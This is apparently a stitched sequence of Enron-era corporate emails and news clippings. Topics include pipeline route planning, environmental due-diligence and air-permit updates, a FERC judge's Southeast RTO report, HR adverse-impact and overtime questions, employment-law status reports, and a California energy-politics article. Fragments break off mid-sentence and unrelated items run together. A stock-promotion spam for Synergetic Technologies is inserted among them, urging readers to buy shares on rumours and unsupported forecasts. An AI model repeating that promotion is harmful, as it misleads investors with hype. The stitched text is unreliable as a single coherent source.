portion.  As the primary route begins to solidify with alternates, we will 
need to develop some preliminary maps.  It is my understanding that no maps 
of the route will be released with sign-off from the entire group of: Hyatt, 
Taylor, Veatch and Shafer.

After we receive the ""fatal-flaw"" desk-top analysis from ENSR (Sept. 21 - 
although I hope to get it sooner), I would offer that several events should 
be scheduled to expedite the project as follows:
1. If the open season reflects that we have a project and Eric Gadd approves, 
a couple of quick meetings will be held with strategic groups to discuss the 
project potential (TNC, State Land Managing agencies, US Forest Service, 
etc).  These strategic groups will be identified by the ENSR fatal-flaw 
analysis.
2. Simultaneously, we will begin working with ENSR (if the open season 
reflects that we have a project) on developing a full scoped Environmental 
Strategy for Sun Devil (this will include an RFP that will immediately go out 
soliciting bids for the Resource Reports and permits). 
3. We will work with Steve Veatch and Joe Hartso to schedule a meeting with 
the FERC Staff (we need the commitment of the State Land Managing Agencies, 
US Forest Service, etc. to collaborate with the FERC on the NEPA review) to 
introduce the project and solicit their commitment to offer staff resources 
early in the process.
4. We will also need to develop a Public Relations and Government Affairs 
strategy which will identify the early meetings that need to be held with 
local, state, federal jurisdictional governing bodies and politicians - so 
the right folks have a heads-up on the project before it hits the news 
media.  This also includes developing a strategy on where and when the 
project will formally be announced (i.e., news conference in Phoenix or 
Houston, etc.).  A $580 Million project will be a big deal in the Phoenix 
area and for the Southwest.

418,"Randy, this is a short summary of the environmental findings that were 
identified during the records review conducted at the Corpus Christi Koch 
facility offices on May 1st and 2nd of this year.

All environmental records which were available in the file data room at the 
Koch office  were reviewed.  Assumptions were made that the environmental 
records were complete for all assets included in the sale.  Primary emphasis 
was placed on those environmental issues which are normally associated with a 
sale or purchase of assets dealing with distribution and transmission of 
crude oil. In particular, pipeline and tank farms were the most critical 
assets which were reviewed. 

Based upon the data review, the Koch assets were in compliance with the 
following:

  Air permitting, permit by rule, standard expemtions, recordkeeping and fee 
payments were documented 

  NSPS recordkeeping and inspections for VOC control on large crude oil tanks 
were documented 

  Oil Pollution Act-OPA 90 plans had been prepared and were up to date

  SARA compliance and reporting had been completed

  SPCC plans had been prepared for each site which qualified under 40 CFR 112

  Spill reporting history and notifications to the state agency were 
available for review

   There are ongoing groundwater and soil remediation activities at one site 
included in the asset for sale
     (permits for the remediation activity is in place)

  Hazardous waste notifications, annual reportings and fee payments were 
documented

Based upon the above review, there were no issues which could be identified 
which would be condsidered a major environmental limitation or would be a 
considered a major environmental  liability.  This statement is again based 
upon the assumption that all environmental information was present in the 
data room for the assets in question.  It should also be stated that this 
analysis of Koch's environmental compliance is based upon the fact that Koch 
has not held back or provided false or misleading information or knowledge 
during their presentation or informaiton contained in the facility files.

Pending further development and interest of this potential purchase, a 
recommendation is made to conduct a phase I due diligence and site visit to 
each location to verify findings from the records review.   Also, due to the 
past history of Koch's operating practices, it is recommended that contract 
conditions be implicitly stated that EOTT will not be held liable for 
discoveries of past deficiencies or releases of contamination which have 
occurred on any of the Koch assets purchased.

Transwestern has run into some problems with the air permit conditions for 
the Redrock Expansion.  For the state permits, the ADEQ wants to abitrarily 
set a 10% safety factor to the emissions levels which approach PSD. This 
means that they have written into the draft permit a reduction in the 
allowable hours of operation for  the generator from 8760 to 7800.  This 
generator is the facility's prime source of power and therefore, needs to be 
operated for 8760 hours.  Transwestern will challenge the agency's authority 
to apply a 10%safety factor.

For the Indain lands permits, the EPA has written a permit condition of 25 
ppmvd for NOx and CO under all operating conditions.  Manufacturerers 
guarantees only apply at 25 ppmvd at loads above 65% and at 0F.  It appears 
that Transwestern may have convenienced the EPA to back away from permit 
limits in ppmvd and include as permit conditons lb/hr and ton/yr emissions 
limits that Transwestern originally placed into its applications.

Northern Natural Gas Company

A standard exemption for the NNG Martin Co. No. 1 facility was submitted to 
the TNRCC.  Preliminary maintenance activities and newly published AP-42 
emissions factors have shown that the Martin Co. 1 facility may be a Title V 
facility.  Under the old AP-42 factors, the units at the facility were not 
greater than 100 ton/year sources.  Continued investigation  is being 
conducted to determine emissions levels from the units at the facility. 

EOTT
A request and supporting documentation was submitted to the TNRCC to remove 
the EOTT Crane facility from the Title V operating permit program.  New data 
on the crude oil received into the facility shows the emissions limits for 
VOCs to be less than the Title V regulated limit.

426,"The State of New Mexico conducted a surprise air inspection of the TW Atoka 
No.3 C/S.  The agency found no non compliance issues or violoations during 
the inspection.

The second quarter Transwestern/SoCal PCB management committee meeting was 
held this week.  Transwestern's share of the PCB management and disposal 
activities on the SoCal system for the quarter was $125,950.00.

The State of New Mexico has issued the settlement penalty for the turbine 
replacement issue at the P-1 C/S.  The original amount levied against 
Transwestern in 1997  was $14,700.  After the Air Quality Bureau sat on this 
issue for more than 4 years without resolution, they reassessed the penalty 
to be $162,770.   A conference call will be set up to discuss Transwestern's 
next course of action.

The summary report for due diligence conducted in Portland Ore. was completed 
and submitted to Environmental Affairs in Houston.

OTC Investor News has heard reports that Synergetics Tecnologies may be acquiring a bulletin board listing very soon.

Synergetic Technologies, Inc. announced in a press release on Monday February 4th that the company will begin beta testing of its airline security and anti-terrorism system. OTC Investor News has also heard a rumor that the company may be heading into a bulletin board entity in a very short timeframe. Share volume for the past six weeks is reflective of increased business activity and momentum as the stock has gained in price over the past two weeks and the potential for share appreciation seems quite positive.

OTC Investor News believes that immediate near term share appreciation will take place - Here's why:

* OTC Investment News has learned that strong support is coming in from European investors.

* SYGE has recently announced contract negotiations for substantial anti-terrorist system sales - we believe that many more contracts are on their way.

* SYGE recently announced the acquisition of Custom Broadband - completing the technical infrastructure required to deploy the anti-terror system in aircraft.

* OTC Investment News  Believes that a bulletin board listing is imminent. Typically, listing on the BB will enhance the share value.

* SYGE is near the low end of the price spectrum and is seeing record trading volume at this time. OTC Investment News  believes that there will not be a more opportune time to accumulate a position in this company.

444,"The ALJ submits her report to FERC to obtain FERC review of the Southeast P=
ower Grid platform that resulted from the mediation.=20
=20
** JUDGE'S FINAL RECOMMENDATIONS:  FERC should consider adoption of Grid Mo=
del (the one Enron likes best) to fullest extent possible and that remainin=
g unresolved issues be addressed through continued stakeholder process.  Ho=
wever, since complete consensus was not reached, FERC should provide its de=
termination of which of the two models best meets FERC's expectations as a =
platform for the SE Power Grid RTO.  This should be done by FERC quickly.  =
There should be no further delay.  Regardless of the model, FERC should enc=
ourage the collaborative process.  She thinks that this should be done by t=
he parties without FERC intervention except to the extent to respond to FER=
C orders. (I think FERC staff should be involved or it will get bogged down=
).  Parties should reconvene within 15 days after FERC's order adopting a m=
odel and the FERC order should direct the participants (like us) to submit =
a joint proposal within 45 days thereafter.  She recommends to FERC that pa=
rties be allowed to file comments to FERC within 20 days (however, she reco=
mmends against permitting reply comments since they may prove counterproduc=
tive to the collaborative nature of the mediation process.)  The Commission=
 will then issue an order that can adopt her recommendations, may reject he=
r recommendations, or change something.  I would expect that the Commission=
 would adopt many of her recommendations, while allowing further mediated-t=
ype discussions on some issues (hopefully, FERC will adopt many of our sugg=
ested changes).  Judge McCartney then basically describes both proposals of=
 the Grid Group and the Southern, etal. group, then provides the stakeholde=
r participants' comments (almost verbatim from all submissions to her).  Wh=
ile she states that the process should keep moving quickly, she does not ad=
opt any timeframes (we will comment that FERC should retain its Dec 02 Day =
2 start date (for LMP/financial rights congestion model to be implemented).

The attachments below are her report, the Southern, etal proposal and the G=

She recommends that SPP pursue an RTO coalition in the Midwest=20
She encourages FERC to continue to encourage and utilize a collaborative pr=
ocess which accommodates stakeholders and state utility commission input, r=
egardless of the RTO platform ultimately adopted by FERC=20
Her opinion is that the ""Grid (Entergy, GridSouth and GridFlorida utility s=
ponsored) Model"" (transco in RTO, LMP/financial rights congestion managemen=
t) is better developed and more clearly in compliance with the requirements=
 of Order No. 2000 based on a ""best practices"" analysis of other RTOs and C=
ommission precedent.  This is good because Enron generally favors the Grid =
model. However, she does provide the Commission information on Southern, et=
al.'s proposal (independent system administrator--like National Grid-type) =
in her report, even though she has concerns that the Southern, etal model i=
s not Order No. 2000 compliant.  The Southern, etal. model has a hybrid phy=
sical congestion management with day ahead balanced schedule requirements a=
nd LMP in real time (with penalties) and significant control area responsib=
ilities.  The significant aspects of the Grid model are discussed below:=20
Grid Governance: RTO is a for profit transco with an independent board and =
an enhancement:  the Independent Market Administrator (IMA).  The IMA was a=
dded to facilitate public power participation (worried that transmission ow=
ner on top, even if divested from generation, would favor its transmission =
solutions over generation or other transmission solution).  The IMA would a=
dminister the markets; exercise operational authority over the transmission=
 system; administer one OASIS (with one process for interconnection and tra=
nsmission requests); and assume the Security Coordinator function.  She str=
ongly encourages this split.=20
Good stakeholder advisory Committee (provides majority and minority views) =
and an independent Market Monitor to monitor the RTO and the markets=20
Allows for Independent Transmission Companies (Entergy wants to be one), wi=
th RTO oversight=20
Describes that control area operators will initially maintain their control=
 areas for physical operation, such as switching transmission elements, pur=
suant to operating procedures approved by the RTO/IMA.  Recognizes that con=
solidation of control areas may occur as RTO matures.  (Protocols should be=
 subject to further discussion)=20
RTO/transco has primary responsibility for tariff administration, including=
 rate changes and tariff filings=20
All load under the rates, terms and conditions of OATT (GridSouth group has=
 appealed this part of earlier Commission orders, and, thus, retains their =
rights should they win on appeal)=20
4 transmission pricing zones initially: Entergy, Southern, GridSouth, and G=
ridFlorida.  Allows for participant funded, direct assigned, and merchant t=
ransmission.  Transmission rates to loads in RTO will be zonal (for existin=
g facilities) and regional charge (for new facilities, other than those abo=
ve).  There will be one ""through and out rate"", plus a Grid Management Char=
ge for RTO operation.=20
Encourages conversion of existing transmission agreements to OATT=20
Financial Rights/LMP (includes ""real time spot market"") is clearly the pref=
erred model and represents best practices model (from PJM and SPP) -- many =
details need to be worked out in continued discussions.  Model allows parti=
es to transact bilaterally and provides financial congestion hedges (FCH). =

 requirement that we will provide comments against=20
Will allow establishment of markets for ancillary services once they can be=
 supported -- control area operators required to provide before such market=

RTO runs single OASIS and independently calculates ATC and TTC=20
RTO/transco is responsible for planning through a participatory stakeholder=
 process=20
Numerous comments from marketers, IPPs on reduction of control area functio=
ns (all of our comments from last week's response are included)=20
Judge McCartney had numerous meetings with state commissioners.  (1) Many a=
re still concerned that FERC had not conducted a ""cost-benefit"" analysis an=
d had concerns over the costs.  She responds that extrapolation of costs to=
 the entire SE RTO seems unwarranted because it ignores the ""economies of s=
cale"" and initial reliance on existing control centers and infrastructure. =
 In any event, FERC could explore the feasibility of a rate setting process=
 that would involve the state commissions. (2) concerned about cost shiftin=
g:  mediation team discussed phase in of rates that the Commission has allo=
wed. (3) Concern that SE RTO would preempt state ability to approve asset t=
ransfers to RTO and want state retail customers to receive full value for a=
ssets.  (4) concern that SE RTO may prematurely put Southern states into re=
tail open access (concerns with Cal.)  Judge encourages the Commission to u=
tilize a collaborative process that includes input from state commissioners=
.

I think our message for any press discussions tomorrow should focus on the =
extremely beneficial aspects of the mediation and the significant ""jump sta=
rt"" it gave to the SE RTO process due to the significant role played by Jud=
ge McCartney and her team on focusing the discussions.  Furthermore, the in=
itial results after 45 days show the majority of participants favoring a ""b=

MP pricing and financial congestion hedges and an RTO with an independent b=

478,"When looking at representation and determining if there is advserse impact 
you need to look at the percentages as below:


                 Total              1                     2                  
3                      4                     5                 NR  
Males          26         4  (15.4%)      16 (61.7%)           6 
(23.1%)         0  (0.0%)         0 (0.0%)       0 (0.0%)  

Females       6           0   ( 0.0%)        3 (50.0%)            2 
(33.3%)         1 (16.7%)        0 (0.0%)       0 (0.0%)


You want to determine if women (or minorities, or over 40), based on their 
representation, are being adversely effected.  You look at the total women 
and how their distribution over the ratings equates, then you look at the 
total men and how their distribution equates--you are looking at them 
individually and not overall.  After this is calculated you determine by 
rating category if women are within 80% of the ratings men received-- if they 
are within 80% there is no adverse impact.  If it is less than 80% there is 
adverse impact.  For example, let's look at the ""2"" category.  There are 16 
of 26 men that received ""2's"" or 61.5% of the male representation.  There are 
3 of 6 females that received ""2's""  or 50% of the female representation.  To 
determine if the females are being adversely effected you take 50% and divide 
it by 61.5% and get 81.3%--as this is more than 80% there is no adverse 
impact.  Now, let me throw a curve ball.  In calculating adverse impact it is 
assumed that if women (or minorites) are being effected more it is a bad 
thing.  In the case of looking at ratings this may not be the case so a 
standard formula cannot be applied.  For example,  if more women are getting 
""1's"" than the males this is not a bad thing but if more women are getting 
""5""s this is a bad thing!  You have to use some judgement on this because if 
more female's based on their representation are getting 3's maybe that is bad 
and maybe that is good--you have to look at the overall picture.  When you 
are calculating adverse impact on employment actions like hires or 
terminations it is very straight forward but when looking at it from a rating 
perspective it can get tricky because you are making comparisions over 
mutiply categories which mean different things--the 1's being good and the 
5's being not so good. 

I would recommend that you proceed with the chart as I typed it above and not 
try to build in the adverse impact piece.  The HR person looking at the data 
in the PRC meeting will need to do some quick calculations based on how the 
distribution is for determining adverse impact.  If you have any questions or 
if I can help please let me know.

479,"Mark,

As you requested, below is a list of my major accomplishments for the year.  

1. Resolution/management of pre-litigation and litigation matters, 
including:  Dwayne Hart/Utilicorp; Satterwhite; Barrington; Race/Statoil; 
Ross Malme; Rick Blandford; West Boettcher; Anita Suson; Charlie Weymms; 
Steven Cuneo; others.

2.  Efficient management of drafting, negotiating, revising, and completing 
several types of contracts in numerous different jurisdictions (e.g., almost 
200 employment agreements, 35 separation agreements, and 30 consulting 
services agreements).

3. Lead attorney on Project One (which involves issues surrounding the 
OFCCP's ""glass ceiling"" audit of ENA and all of Enron).

4. Labor and employment transactional support, including:  East Coast Power, 
Ecogas, CGas, Project Hurricane, Columbia, Project Grizzly, Las Vegas Cogen, 
and other acquisitions that involve the transfer or hiring of personnel. Many 
of these transactions require extensive legal support relating to personnel 
matters after closing.

5. Legal support on labor (union) matters, including successful closing of 
project labor agreements for the construction of generation assets (e.g., 
Pittsburg, 2000 peakers, Pastoria), Unfair Labor Practice matters, training 
on union-related issues in M&A's.

Let me know if you need any more information, and thanks for your support!

491,"Hi, Charla,

I have reviewed the additional fields you described.  Most of them look fine 
with me.  I do have some concerns with the questions about birthplace, 
citizenship, personal travel, and reason for return from prior assignment.  

The questions about birthplace/citizenship are the most risky.  As I have 
discussed with others, such questions could create issues of national origin 
discrimination, particularly if one's birthplace country is not evident from 
any other source.  It also could create a privacy issue if we are asking 
questions that are not job-related and consistent with business necessity.  
What is the purpose of this inquiry?  Are we trying to determine whether  a 
person is eligible to work in a particular country?  If so, it appears that 
birthplace and citizenship are not the answers that we need.  We already have 
a field on where a person is eligible to work, which would cover the 
situation where a person has citizenship in one country, but is on a work 
visa to another.   Any other information may not be necessary.

The question about reasons for returning from leave also could unearth 
information that we really don't want to keep on a system.  For example, if a 
person left because of health reasons, or the birth of a child . . . it 
really is not a job-related issue.  What is the purpose of this question?  Is 
there a less intrusive way to ask it?   

Finally, the question about countries visited for personal reasons also is 
asking information that is not job-related.  What is the purpose of that 
inquiry?  Is there another way to gather that information?

Let me stress that none of these inquiries is unlawful -- some of them may be 
unwise for the reasons I cited above.  If you would like to discuss this 
further, please give me a call.

Michelle,

We have had a couple of interpretations as to how to calculate the overtime 
for employees who receive a shift differential and wanted to ask for 
assistance from you.  The problem we are having deals with employees who 
rotate shift.  Please review the following scenario.

For a simple example with an ee at $10/hour and shift of $1/hour for the 
Night (N) shift.


  M T W Th F S

REG  8 8 8 8 8 
OT       8 
SHIFT  N N D D D D 


Interpretation 1

The shift differential would be added to his pay to determine the regular 
rate of pay and his pay would be calculated as follows:

REG  $400
SHIFT       16
OT    124.80  ((400+16)/40) x 1.5)


Interpretation 2

Since his overtime was during a day shift, his pay would be calculated as 
follows:

REG  $400
SHIFT       16
OT    120.00 (400/40 x 1.5)

Can you please let us know which interpretation is correct or if we have 
totally missed the boat on both of them?

Thanks for your help,
Diane

Transactions

Major Events of September - November 2000

Garden State Paper -- closing and transition.

Triple Lutz -- issues surrounding potential divestiture, including internal 
discussions, review of data requests and responses, review and comment on 
both PSA documents, negotiations with both buyer's representatives, and 
discussions with clients.  Issues include salaries of employees hired by 
buyer (effect of Enron severance plan), other benefits for divested employees 
(including unvested stock options, insurance, vacation, etc.), process for 
divesture, payment of severance obligations, possible redeployment, etc.

Crane -- monitor due diligence, PSA review and comment, client discussions.

Falcon -- review diligence reports, client discussions.

E2  -- limited involvement in PSA and schedule review, data requests.


Anticipated Issues for December 2000 - February 2001

Triple Lutz -- continued negotiations and document drafting.  Transition 
issues for divestiture will continue to be significant.  Litigation by 
persons who lose their jobs as a result of the transaction and who choose not 
to sign the waiver for double the severance benefits is possible.

East Coast Power:  If we sell our interest in ECP, there will be many 
transition issues due to Enron's providing benefits, payroll, etc. for ECP 
personnel.  Also, there will be transition issues for other services, 
including legal services that Enron has been providing for ECP.

Crane/Falcon -- could move forward; Crane is more likely.  Issues of labor 
unions and Canadian law will require attention on transition issues.


Litigation

Major Events of September - November 2000

No employee-initiated litigation for 2000.

Non-compete litigation:  Currently, suit pending against Alonzo Williams in 
Sharolyn Wood's court.  Suit filed, no TRO sought.  Service in process.

Minor litigation:  Marentz & Co. v. Enron.  Suit for non-payment of placement 
fee.  Maximum damages $75K.  Discovery period ends this week, court-ordered 
mediation to follow.

Anticipated Issues for December 2000 - February 2001

I expect that we will be filing non-compete litigation in February and March, 
as people leave after they are paid their bonuses.  

We should discuss the continued use of Bill Ogden for non-compete litigation.



Documents Generated

Major Events of September - November 2000

New Consulting Services Agreement:  I prepared a new form of Consulting 
Services Agreement to replace old Master Service Agreement and Project Work 
Description for Net Works contract personnel. I received minor comments from 
outside counsel as well as client group feedback.  I will finalize the 
agreement, so that the new document can go into effect on 1/1/01.  

Standard Agreements:

I prepared:

  ___ draft employment agreements.

 ___ draft consulting services agreements.

  ___ separation agreement and releases.

 ___ retention letter agreements.

The number of employment agreements seems low to me, particularly in 
trading.  My understanding is that Lavorato does not want to put every person 
in trading under contract, but wants to wait and see how they perform.  There 
are potential legal risks with this approach if we want to enforce our 
non-compete provisions. 

Anticipated Issues for December 2000 - February 2001

I expect that, after bonus amounts are announced, there will be a flurry of 
contract activity in efforts to pay people through means other than the bonus 
pool.  

Investigations

Major Events of September - November 2000

Anonymous Letters Sent to Office of Chairman about Energy Operations:  I 
directed the investigation and supervised outside consultants once the 
company decided to employ them.  I and the team reviewed the results with 
Sally Beck in early November and proposed methods to address the results of 
the consultants' surveys.  Sally Beck is contemplating communication to 
employees on results of survey.  [Other proposals can be discussed verbally.]

Texaco Hacker:  We had a situation where one of our employees logged onto the 
Texaco computer system using an ID of a former co-worker.  He then sent 
inappropriate emails to her co-workers, posing as her.  The investigation 
results led to termination of employment for cause.

Anticipated Issues for December 2000 - February 2001

I expect that there will be some claims that will need to be investigated 
following PRC/bonus discussions. 


Training

Major Events of September - November 2000

 Increased role as trainer.  I provided interview training for all Net Works 
employees who are involved in the Technology Track (about 10 sessions).  

Anticipated Issues for December 2000 - February 2001  

EIM:  Ray Bowen has asked Julia and I to provide training to the Industrials 
Group.  The focus will be on labor and employment issues in the acquisition 
of assets as well as the integration of assets into the Enron family.  

All of Wholesale:  The harassment prevention training is going to be repeated 
early next year for all persons hired in the last 18 months.  Refresher 
training is being developed and will be delivered for those who already went 
through the first round.

Pre-Hire Testing 

Major Events of September - November 2000

Many Wholesale groups are looking at pre-employment testing as a method of 
screening out applicants.  I am working with the Training and Development 
groups to ensure that the tests meet legal standards.  I have suggested 
experts for HR to use in validation of such tests to ensure that the tests 
will result in a successful employee.

Re-Skilling:  One aptitude test is being employed in the selection of 
potential employees who may be re-skilled to perform IT jobs working under 
Beth Perlman. 

Anticipated Issues for December 2000 - February 2001

I expect the testing issue to continue to be hot, particularly since John 
Lavorato likes the concept for use in the Trading Track rotations for the A&A 
program.


Employee Relations/Terminations  

Much of my time is spent providing advice on employee relations/termination 
issues -- approximately 10-15 per week (total).  No two situations are alike, 
and they require significant time.

Anticipated Issues for December 2000 - February 2001

After PRC/bonus time, this area of practice will be exceptionally busy.  The 
company will put persons who received a Needs Improvement or lower rating on 
a performance improvement plan.  Generally, I review those before they are 
put in place.  If they are not successful, then terminations are likely 
(probably early in the first half of 2001).  Those issues are time-consuming 
and full of risks.

Work for Portfolio Assets

Major Events of September - November 2000

Ecogas:  wind-down issues.

Mariner:  Change of Control Agreements.

CGAS:  harassment prevention training -- arranged for Littler, Mendelson to 
provide training for CGAS personnel.

East Coast Power:  Agreements, advice and counselling on various issues.

Anticipated Issues for December 2000 - February 2001

CGAS:  Revising employment agreements for key personnel.

Mariner:  Employment agreement negotiation.


Conclusions


ENA:  ENA has not been able to hire commercial talent at the levels of 
manager and above.  I expect to see a great emphasis on hiring.  Lavorato has 
placed processes in place for hiring at that level, including the requirement 
of an interview with the OOC before someone can be hired at the level of 
manager or above.  

Salaries need to be reviewed for equity (by gender as well as by race).

Net Works:  Net Works has hired over 800 employees and contractors in 2000.  
I expect that a portion of those will be bad hires and will have to be 
managed out.  Generally, the IT personnel are not the best about counselling 
and documentation, so there may be significant work to be done to  ensure 
that risks are managed in that situation.  I have seen improvement in that 
group working with HR, and they have invited me to conduct training, so it 
may improve over time.

Contractors are another issue at Net Works.  A significant portion of the 
work force is contract personnel.  Microsoft issues could arise if 
contractors are allowed to stay on too long.

Misclassification under the FLSA is another issue.  Net Works has too many 
employees in the ""exempt"" category who should be classified as ""non-exempt.""  
I have raised this issue with HR, and they are working through it.  It will 
not be an easy fix.

EIM:  The biggest issues facing EIM include the attraction and retention of 
talent as well as M&A activity.  HR has hired a person from Azurix to handle 
diligence for EIM, but only time will tell whether she will be able to handle 
the job.  

EGM:  EGM has the same issues of hiring and retention of talent as other 
groups within Wholesale.  That, plus the added earnings pressures, will make 
retention of key personnel essential.  I expect to see continued pressure to 
shorten the non-compete duration for this group.

Since this deal is beginning to heat up again, I wanted to get you back in 
the loop.  The earlier e-mail is a good overview of the structure proposed

not anticipated at this time that many, if any, employees will be

ALJ Clears Transwestern of Market Power Charges 
A FERC administrative law judge has found no improprieties, nor evidence of the exercise of market power in negotiated rate contracts between Transwestern Pipeline and two shippers on its system, which resulted in the shippers being charged as much as $27/MMBtu last February, far in excess of the pipeline's allowed transportation rate of 38 cents/MMBtu (RP97-288-009). 
ALJ Jacob Leventhal had only one fault to find, and that was with Transwestern's method of posting capacity. The judge said, and Transwestern agreed, to modify its tariff ""so that all posting, bidding and award procedures are set forth in a separate provision with an appropriate caption"" on its Internet bulletin board. Shippers had said that reviewing capacity on the Transwestern web site was ""a tortuous process."" 
Indicated Shippers claimed Transwestern's inadequate capacity posting and award procedures did not provide all interested parties with an opportunity to bid for the capacity that was available. 
While ""both Indicated Shippers and (FERC) Staff find it curious that SET (Sempra Energy Trading) and Richardson (Products Co.) were the sole bidders on the contracts awarded to each of them...curiosity does not translate into proof,"" the judge said. Witnesses in the expedited hearing testified no bids were considered in advance of the capacity posting (see Daily GPI, Aug. 30). The judge subsequently found the capacity was awarded in a manner consistent with Transwestern's tariff. 
Similarly, Levanthal could find no evidence that Transwestern exercised market power in negotiating the rates with shippers or withholding or threatening to withhold capacity. The capacity was available at recourse rates, and the shippers knew those rates were available. ""Staff's arguments really are criticisms of the posting and award procedures, but do not demonstrate the exercise of market power."" 
The two shippers said they made a business decision to propose the ""index-to-index"" formula that produced the higher rates, rather than take the recourse rate ""to minimize any risk on transportation options."" The index-to-index formula refers to taking the difference between the daily published commodity prices at two different points and subtracting to get the transportation rate between them. In this case the two points were the San Juan Basin and the SoCal Needles delivery point. 
The case was set for expedited hearing last summer by the commissioners acting on staff recommendations (see Daily GPI, July 26).

But Democratic controller points at governor 
Carla Marinucci, John Wildermuth, Chronicle Political Writers

N154353.DTL 
Anaheim -- The politics of energy dominated the state Democratic convention 
yesterday, as anxious delegates gave a lukewarm reception to embattled Gov. 
Gray Davis, who clashed bitterly with party rival, Controller Kathleen 
Connell. 
Speaking at the Anaheim convention center, where dimmed lights were a 
constant reminder of yesterday's Stage 2 alert, Davis blamed California's 
energy woes on former Gov. Pete Wilson, Republican lawmakers and the Federal 
Energy Regulatory Commission, which, he charged, has failed to regulate 
greedy energy firms selling power at ""out of control prices."" 
He insisted that he was not sure rate increases were necessary, refusing to 
say whether he would support huge hikes backed by the Public Utilities 
Commission last week. He suggested, however, that he favors a system of 
tiered electricity pricing. 
""These Republicans -- who were so enamored with deregulation just five years 
ago -- have become even more enamored with criticizing me as I try to clean 
up their mess,"" the governor said to tepid applause from the 1,900 delegates. 
""This deregulation disaster was authored by a Republican legislator, 
passed by a Republican Assembly, signed into law by a Republican governor and 
implemented with undue haste by a Republican PUC."" 
But the governor's Republican-bashing was overshadowed politically by an 
attack by state Controller Connell, a candidate for Los Angeles mayor -- who 
rejected what she called Davis' ""finger-pointing"" and assailed his handling 
of the crisis. The dramatic development demonstrated both deepening rifts 
within California's ruling party and the high political stakes of the energy 
crisis. 
""There will be no excuses for Democrats in this state, because we dominate 
state government,"" Connell said in a convention speech in which she also 
outlined proposals to require ""power hogs,"" such as malls, to install their 
own microgenerators. 
""I spent the past eight years making sure the state had a surplus, and now 
I'm seeing it eaten away every day by energy costs. . . . Whatever solution 
(the governor) provides must come fast and be shared openly with the people 
of California,"" she said in a dig at Davis, who has been criticized for 
moving too cautiously and for resisting disclosure of energy contracts to the 
public. 
Warning of the costs of ""a delay and an incremental approach to an indefinite 
problem,"" she said, ""I won't stand by and allow the consumers to pick up the 
tab."" 
DAVIS DEFENDS POLICIES
Asked to respond to Connell's critique, Davis told reporters, ""I believe 
we've moved at warp speed to address this problem. . . . We've kept the light 
on most days."" 
The governor, who endorsed Connell's opponent, former Assembly Speaker 
Antonio Villaraigosa for mayor, then added, ""It might be if she's not happy 
with that, she can run for governor next time."" 
Garry South, the governor's senior political adviser, was even more caustic, 
lambasting Connell as a party infidel. ""This is why Kathleen Connell doesn't 
have a friend in all Los Angeles,"" he said. ""She's been picking on the 
governor since day one."" 
""It's all air,"" he said of her talk. ""Not only hot air but a foul wind."" 
In an interview while campaigning later in the day, Connell toughened her 
rhetoric, saying, ""The emperor has no more clothes here in California."" 
""We are well into the fifth month (of the energy crisis) and we have yet to 
find any answers from the administration,"" said Connell, who promised to 
release her own detailed solutions to the crisis next week. 
Unlike many Democrats at the convention, festooned with ""Wilson Did It"" 
signs, she rejected as ""irrelevant"" the suggestion by Davis that Republicans 
were to blame for California's energy woes. 
""Californians are wearying of this finger-pointing and closed-door 
negotiations and extended debate,"" she told The Chronicle. ""The public is no 
longer going to be patient with us. They're going to hold the governor 
accountable when they get the bill."" 
CONNELL LAGGING IN POLL
Connell, who is forced by term limits to give up her post as controller next 
year, has lagged in her campaign to become mayor of Los Angeles. With 10 days 
to the election, a recent poll showed her running fourth behind City Attorney 
James Hahn, Villaraigosa and businessman Steve Soboroff. 
Despite Davis' words and speculation among delegates, Connell denied she was 
eyeing the governor's seat for the future. ""I'm not looking two or three 
years down the line,"" she said. ""But I hope the governor is looking toward an 
immediate solution to this problem."" 
The governor's speech was his first since the PUC announced rate increases of 
as much as 46 percent. Davis refused to say whether he would support the 
immediate rate increase approved by the PUC but suggested that he would back 
a tiered billing system. 
""If a rate increase becomes absolutely necessary to keep our lights on and 
our economy strong, you can be sure of one thing from this governor,"" Davis 
said. ""I'll fight to protect those least able to pay, reward those who 
conserve the most and 'motivate' those who are the biggest guzzlers to cut 
back."" 
He later dodged reporters' questions about specifics, repeatedly saying that 
within the next two weeks he would release a statement detailing ""what, if 
any"" increases were needed. 
""Many advisers from Wall Street are running numbers, and they appear to be 
different from the PUC's,"" he said. 
Davis also said he has already done a lot to address the crisis and had ""kick 
started"" construction of new power plants and successfully promoted 
conservation programs. 
Some of Davis' backers at the convention, watching the squabbling, expressed 
concern about some of the governor's tactics. 
""People want a leader to lead,"" said Susan Leal, San Francisco's city 
treasurer. ""They're looking for someone to come out and take command, 
regardless of who started this."" 
But, she said, Davis is a tough and smart politician, and ""people are still 
going to be forgiving if (the governor) does something to attack the 
problem."" 
OTHER DEMOCRATS BLAME GOP
Other Democratic Party leaders were also quick to defend Davis and to blame 
Republicans. 
Terry McAuliffe, chairman of the Democratic National Committee, suggested 
that President Bush has ignored California's energy problems because ""he's 
worried to death about Davis running for president."" 
California is the world's sixth-biggest economy, McAuliffe noted in an 
interview, and Bush ""has basically written it off, saying, 'Good luck to you. 
You're not getting any help.' "" 
Art Torres, chairman of the state Democratic Party, said Davis ""is attacked 
every day by the backbench Republican yahoos in the Legislature"" and 
predicted that public concern over energy would ebb by next year's election. 
""We're looking at issues that are going to transcend the energy issues we see 
now,"" Torres said, such as crime and violence in the schools, economics, the 
environment and abortion. 
But political analyst Sherry Bebich Jeffee said Connell's criticism was 
evidence of a party split and perhaps ""the opening salvo in 2002,"" when Davis 
is up for re-election. 
Davis's entire party, she said, could be in trouble if voters get fed up with 
higher energy bills. 
""Do the math,"" said Jeffee, noting that Democrats hold all but one state 
office and control of the both houses of the Legislature. ""If you're going to 
throw the bums out, the bums in this state are mostly Democrats.""

563,"From today's Gas Daily:

***Breathitt wants more attention on Calif. gas

     Although the energy spotlight has been on California's 
electricity crisis, the number of California gas issues at FERC is 
continually increasing, signaling the need to focus on the gas side 
of the equation, a FERC commissioner said last week.
     ""[T]here is volatility in the gas markets as well as the electric 
markets,"" FERC Commissioner Linda Breathitt said at the American 
Gas Association's FERC Natural Gas Regulatory and Market Issues 
Seminar last week in Washington, D.C. And the cost of gas, she said, 
is the component that has the biggest influence on the cost of 
electric generation.
     Two issues pending at FERC are whether to re-impose price caps 
on secondary market transactions and whether to cap prices on 
gas sales, Breathitt said.
     In addition, FERC recently issued an order to help remove 
obstacles to increased energy supplies into the West (GD 3/15). In 
the order, FERC sought comments on the need to provide rate 
incentives for projects that would make additional capacity 
available by this summer on constrained pipeline systems. ""I believe 
that if the commission does provide incentives, we should be very 
precise regarding the activity we are encouraging and the incentives 
we will be willing to consider, if at all,"" Breathitt said.
     The commissioner also voiced concern over a California issue 
